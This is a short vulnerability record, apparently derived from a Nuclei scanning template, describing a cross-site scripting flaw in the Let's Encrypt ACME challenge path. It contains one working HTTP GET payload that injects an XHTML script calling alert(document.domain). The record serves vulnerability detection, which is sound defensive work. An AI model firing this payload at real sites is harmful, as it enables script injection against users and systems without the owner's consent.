# Vulnerability: Let's Encrypt - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`acme-xss.yaml`)

## Description
Let's Encrypt contains a cross-site scripting vulnerability when using the the ACME protocol to issue SSL certificates.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/.well-known/acme-challenge/%3C%3fxml%20version=%221.0%22%3f%3E%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%3Ealert%28document.domain%26%23x29%3B%3C/x:script%3E
```

